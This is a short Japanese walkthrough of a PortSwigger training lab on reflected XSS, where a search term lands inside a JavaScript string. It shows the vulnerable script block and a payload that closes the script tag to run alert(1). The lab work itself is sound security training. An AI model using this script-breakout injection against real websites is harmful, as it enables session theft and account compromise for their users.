# 一重引用符とバックスラッシュをエスケープして XSS を JavaScript 文字列に反映

次のハッキングラボを実施  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

- 1. ハッキングラボにアクセスします
- 2. 検索窓に任意のワードを入力して検索ボタンを押します
- 3. 検索結果ページでソースを見ると検索ワードが javascript に埋め込まれていることが確認出来ます

```html
<script>
  var searchTerms = "abc";
  document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');
</script>
```

- 4. javascript をエスケープするために検索ワードを以下にして検索します

```
</script><script>alert(1)</script>
```

アラートメッセージが表示され、スクリプトが実行できることが確認できます。
